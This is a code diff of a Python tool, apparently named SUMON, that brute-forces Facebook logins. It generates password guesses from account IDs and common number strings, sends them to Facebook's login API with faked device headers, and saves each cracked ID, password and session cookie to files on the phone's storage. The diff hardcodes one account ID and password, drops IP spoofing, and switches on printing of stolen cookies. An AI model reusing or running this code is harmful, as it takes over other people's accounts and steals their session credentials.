@@ -1123,9 +1123,11 @@ def SUMON2():
         print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for guru in user:
-            uid = kode+guru
+            #uid = kode+guru
             mk = uid[:6]
-            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
+            #pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
+            uid ='61557902314449'
+            pwx ='963686'
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1739,8 +1741,6 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ip=generate_unlimited_ips()
-            ips=f"'{ip}'"
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1787,7 +1787,7 @@ def mbasic(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, ip=ips, headers=headers).json()
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1800,11 +1800,11 @@ def mbasic(uid,pwx,tl):
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
                         print(f" {green}[SUMON-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
+                        print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
                         print(f" {green}[SUMON-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
+                        print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
